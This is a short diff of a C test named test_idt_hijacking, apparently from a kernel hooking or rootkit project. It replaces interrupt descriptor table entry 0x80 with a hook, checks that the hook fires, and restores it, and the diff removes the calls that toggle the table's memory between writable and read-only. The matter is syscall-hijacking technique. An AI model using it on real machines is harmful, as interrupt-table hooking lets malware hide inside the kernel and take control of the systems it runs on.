@@ -22,7 +22,6 @@ void test_idt_hijacking(void)
     /* Change IDT entry 0x80 */
     orig_my_hk = idt_get_entry(0x80);
     hook_my_hk = (unsigned long)foo;
-    set_addr_rw(idt_addr());
     idt_set_entry((unsigned long)my_hk, 0x80);
 
     cnt = 0;
@@ -30,7 +29,6 @@ void test_idt_hijacking(void)
     user_land_exec(argv);
     assert(cnt != 0, "IDT entry 0x80 executed");
     idt_set_entry(orig_my_hk, 0x80);
-    set_addr_ro(idt_addr());
 
     /* Completly change the table */
     idt_substitute();
